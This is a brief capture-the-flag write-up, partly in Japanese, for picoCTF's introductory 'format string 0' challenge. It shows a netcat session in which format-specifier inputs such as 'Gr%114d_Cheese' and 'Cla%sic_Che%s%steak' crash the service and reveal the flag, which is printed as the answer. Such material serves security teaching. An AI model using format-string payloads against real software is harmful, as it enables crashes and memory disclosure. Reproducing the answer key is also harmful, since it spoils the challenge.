# format string 0:Binary Exploitation:50pts
Can you use your knowledge of format strings to make the customers happy?  
Download the binary [here](format-string-0).  
Download the source [here](format-string-0.c).  
Connect with the challenge instance here:  
`nc mimas.picoctf.net 50698`  

Hints  
1  
This is an introduction of format string vulnerabilities. Look up "format specifiers" if you have never seen them before.  
2  
Just try out the different options  

# Solution
バイナリ、ソースと接続先が渡される。  
```bash
$ nc mimas.picoctf.net 50698
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
fsbが発生するハンバーガーを選択すると、flagが表示された。  

## picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}